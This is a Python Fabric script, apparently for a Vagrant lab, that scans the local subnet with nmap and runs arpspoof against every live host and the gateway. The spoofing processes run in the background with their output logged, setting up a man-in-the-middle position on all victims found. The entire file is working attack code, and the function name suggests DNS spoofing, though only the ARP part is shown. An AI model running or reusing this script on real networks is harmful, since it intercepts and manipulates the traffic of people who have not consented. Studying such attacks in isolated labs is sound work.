from fabric.api import *
import nmap
import netifaces
import iptools

@hosts(['127.0.0.1'])

def arpdnsspoof():
    env.user = 'vagrant'
    env.password = 'vagrant'
    
    with settings(warn_only=True):
        local_addrs = netifaces.ifaddresses('eth1')
        dict_temp = local_addrs[netifaces.AF_INET]
        # local_addrs[netifaces.AF_INET] => "[{'broadcast': '192.168.43.255', 'netmask': '255.255.255.0', 'addr': '192.168.43.71'}]"
        dict = dict_temp[0]
        # print(dict) => {'broadcast': '192.168.43.255', 'netmask': '255.255.255.0', 'addr': '192.168.43.71'}
        AttackerIP = dict['addr']  # wlan0 ip addr
        print(AttackerIP)
        AttackerNetmask = dict['netmask']
        print(AttackerNetmask)

        AttackerCIDRMask = (iptools.ipv4.netmask2prefix(str(AttackerNetmask)))
        AttackerSubnet_temp = iptools.ipv4.subnet2block(str(AttackerIP) + '/' + str(AttackerNetmask))
        AttackerSubnet = AttackerSubnet_temp[0]

        gw_addrs = netifaces.gateways()
        # print(gw_addrs[netifaces.AF_INET]) => "[('192.168.43.1', 'wlan0', True)]"
        gw_ip_addr = gw_addrs['default'][netifaces.AF_INET]  # => "('192.168.43.1', 'wlan0')"
        GatewayIP = gw_ip_addr[0]
        print(GatewayIP) 

        nm = nmap.PortScanner()  # instantiate nmap.PortScanner object
        nm.scan(hosts=str(AttackerSubnet) + '/' + str(AttackerCIDRMask), arguments='-n -sP')
        hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
        for host, status in hosts_list:
        # print('{0}:{1}'.format(host, status))
            VictimIP = '{0}'.format(host)
            VictimIPStat = '{0}'.format(status)
            if VictimIP != GatewayIP and VictimIP != AttackerIP and VictimIP != AttackerSubnet and VictimIPStat == 'up':
                print("Victim ip to be SPOOFED: " + VictimIP)
                # Tell the 'victim' that we are 'gateway'. Open a terminal window and type the below command:
                sudo('arpspoof -i eth1 -t ' + str(VictimIP) + ' ' + str(GatewayIP)+' > /vagrant/logs/arpspoof1.txt 2>&1 &')  
                # Tell the 'gateway' that we are 'victim'. Open a terminal window and type the below command:
                sudo('arpspoof -i eth1 -t ' + str(GatewayIP) + ' ' + str(VictimIP)+' > /vagrant/logs/arpspoof2.txt 2>&1 &')